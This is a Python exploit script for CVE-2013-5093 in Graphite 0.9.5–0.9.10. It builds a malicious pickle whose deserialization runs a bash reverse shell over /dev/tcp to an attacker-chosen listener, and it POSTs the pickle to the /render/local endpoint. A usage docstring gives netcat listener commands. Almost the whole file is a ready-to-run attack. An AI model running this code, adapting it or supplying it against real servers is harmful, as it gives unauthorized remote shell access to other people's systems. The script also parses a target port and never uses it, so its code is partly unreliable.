#!/usr/bin/env python
# -*- coding: UTF-8 -*-

__author__ = 'f47h3r'

'''
Exploit Information:

    CVE-2013-5093

    Graphite 0.9.5 - 0.9.10
    Remote Code Execution via Python Pickle Exploitation.

    Payload - Reverse Netcat Shell

Credit:

    Props to Charlie Erikson for the initial advisory, and metasploit module. Thanks man!

    Advisory Blog Post - http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/


Usage:

    1) Start up a netcat listener on your local machine: 

        nc -vvv -l <reverse_listener_port>

        nc -vvv -l 8080

    2) Launch this exploit:
    
        ./graphite_pickle_exploit.py -a <target_ip> -p <target_port> -r <reverse_listener_ip> -l <reverse_listener_port> 

        ./graphite_pickle_exploit.py -a 127.0.0.1 -p 80 -r 127.0.0.1 -l 8080

    3) If exploit is successful a shell will be spawned to your netcat listener:

        bash: no job control in this shell
        bash-3.2$ 

Greetz:

    [Buffer]Overflow - http://0x539.us/

    r3dshift, tprime_, moloch, hathcox & [B]O Cr3w - thanks for being awesome hackers... 

    #overcrash on freenode.net

    @f47h3r_b0

'''

import cPickle
#import subprocess
#import base64
import optparse
import httplib


class ExploitPayload(object):

    def __init__(self):
        self.reverse_listener = ''
        self.reverse_listener_port = ''

    def __reduce__(self):
        # This is where we craft our exploit pickle. You can be creative here... ;)
        import subprocess
        return (subprocess.Popen, (('/bin/sh','-c','(bash -i >& /dev/tcp/'+self.reverse_listener+'/'+self.reverse_listener_port+' 0>&1)'),0))


class Exploit(object):

    def sendExploit(self, target_ip, target_port, reverse_listener, reverse_listener_port , poison_pickle):
        # Post Data (Requesting Line Graph and Attaching Pickle)
        payload = 'line\n'+poison_pickle

        # Populate URL String
        #url = "http://"+target_ip+":"+target_port+"/render/local"

        # Headers Setup
        headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Content-Type': 'application/x-www-form-urlencoded'}
        
        # Send Exploit Payload
        conn = httplib.HTTPConnection(target_ip)
        conn.request("POST", "/render/local", payload, headers)
        response = conn.getresponse()
        #print response.status

class TestPayload(object):

    def loadPickle(self, test_pickle):
        cPickle.loads(test_pickle)
        pass


if __name__ == "__main__":
    usage = __doc__
    version = "0.01"
    parser = optparse.OptionParser(usage, None, optparse.Option, version)
    parser.add_option('-p',
                      '--port',
                      default='80',
                      dest='target_port',
                      help='Target Port')
    parser.add_option('-a',
                      '--address',
                      default='127.0.0.1',
                      dest='target_ip',
                      help='Target IP Address')
    parser.add_option('-r',
                      '--reverse-ip',
                      default='127.0.0.1',
                      dest='reverse_ip',
                      help='Remote Listener Address')
    parser.add_option('-l',
                      '--listener-port',
                      default='8080',
                      dest='reverse_port',
                      help='Reverse Listener Port')
    (options, args) = parser.parse_args()


    # Create Payload
    payload = ExploitPayload()
    payload.reverse_listener = options.reverse_ip
    payload.reverse_listener_port = options.reverse_port

    # Create Exploit Pickle
    exploit_pickle = cPickle.dumps(payload)

    # DEBUG Statement
    #print exploit_pickle

    # DEBUGING STATEMENTS
    #b64_encoded_pickle = base64.b64encode(exploit_pickle)
    #print 'Base 64 Encoded Exploit Payload:\n\n%s\n\n' % b64_encoded_pickle
    #print 'Testing Payload Exploitation...\n\n'
    #payload_test = TestPayload()
    #payload_test.loadPickle(exploit_pickle)

    # Instantiate Exploit Object and Send Exploit to target
    exploit_execute = Exploit()
    exploit_execute.sendExploit(options.target_ip, options.target_port,options.reverse_ip, options.reverse_port, exploit_pickle)

    # Sit back and wait for the shell to come to you...
    # nc -vvv -l 8080

    print '\nCheck your netcat shell... ;)\n'
